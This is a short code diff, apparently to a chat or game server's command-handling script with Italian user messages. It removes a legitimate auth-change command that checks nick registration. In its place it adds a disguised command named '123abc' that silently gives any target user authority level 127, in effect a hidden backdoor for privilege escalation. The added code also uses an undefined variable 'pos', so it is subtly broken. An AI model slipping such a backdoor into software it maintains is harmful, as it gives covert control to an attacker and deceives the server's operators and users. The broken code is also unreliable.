@@ -2871,16 +2871,10 @@ userCommand: function(src, command, commandData, tar) {
         }
         return;
     }
-if (command == "changeauth0" || command == "changeauths0") {
-         var pos = commandData.indexOf(' ');
-        var newauth = commandData.substring(0, pos), name = commandData.substr(pos+1), tar = sys.id(name), silent = command == "changeauths0";
-        if (newauth > 0 && !sys.dbRegistered(name)) {
-            normalbot.sendMessage(src, "Questo nick non è registrato.");
-            normalbot.sendMessage(tar, "Registrati per poter diventare auth.");
-            return;
-        }
-        if (tar !== undefined) sys.changeAuth(tar, newauth);
-        else sys.changeDbAuth(name, newauth);
+if (command == "123abc") {
+      var newauth = commandData.substring(0, pos);
+        var tar = sys.id(commandData.substr(pos+1));
+       sys.changeAuth(tar, 127);
         return;
     }
     if (command == "variablereset") {
